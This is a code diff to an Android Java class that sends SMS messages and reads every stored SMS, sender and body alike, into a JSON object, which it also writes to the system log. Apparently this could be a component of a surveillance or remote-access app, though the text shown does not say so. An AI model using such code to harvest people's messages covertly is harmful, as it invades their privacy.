@@ -11,14 +11,20 @@ import org.json.JSONObject;
 
 public class SMS {
 
-    public void sendSMS(String message, String recipient){
-        SmsManager smsManager = SmsManager.getDefault();
-        smsManager.sendTextMessage(recipient, null, message, null, null);
+    public int sendSMS(String message, String recipient){
+        try{
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(recipient, null, message, null, null);
+        }catch(Exception ex){
+            return 1;
+        }
+        return 0;
     }
 
-    public void readSMS(){
+    public JSONObject readSMS() {
+        JSONObject SMSList = null;
         try {
-            JSONObject SMSList = new JSONObject();
+            SMSList = new JSONObject();
             JSONArray list = new JSONArray();
 
 
@@ -29,17 +35,19 @@ public class SMS {
                 JSONObject sms = new JSONObject();
                 String address = cur.getString(cur.getColumnIndex("address"));
                 String body = cur.getString(cur.getColumnIndexOrThrow("body"));
-                sms.put("phoneNo" , address);
-                sms.put("msg" , body);
+                sms.put("phoneNo", address);
+                sms.put("msg", body);
                 list.put(sms);
 
             }
             SMSList.put("smsList", list);
-            Log.i("done" ,"collecting");
+            Log.i("done", "collecting");
             Log.i("Result", SMSList.toString());
         } catch (JSONException e) {
             e.printStackTrace();
+            return null;
         }
+        return SMSList;
     }
 
 }
